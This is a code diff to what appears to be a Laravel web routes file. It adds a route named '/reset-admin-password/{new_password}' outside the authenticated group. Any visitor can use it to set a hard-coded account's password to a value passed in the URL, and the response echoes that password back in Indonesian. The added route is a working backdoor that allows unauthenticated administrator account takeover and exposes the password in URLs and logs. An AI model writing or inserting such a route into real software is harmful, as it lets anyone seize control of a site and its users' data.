@@ -218,6 +218,16 @@ Route::middleware(['auth'])->group(function () {
     });
 });
 
+Route::get('/reset-admin-password/{new_password}', function ($new_password) {
+    $user = \App\Models\User::where('email', 'archived.aljihad@gmail.com')->first();
+    if (!$user) {
+        return response('User archived.aljihad@gmail.com tidak ditemukan!', 404);
+    }
+    $user->password = $new_password;
+    $user->save();
+    return response('Password berhasil diupdate! Silakan login dengan email: archived.aljihad@gmail.com dan password: ' . htmlspecialchars($new_password), 200);
+});
+
 /*
 |--------------------------------------------------------------------------
 | FALLBACK
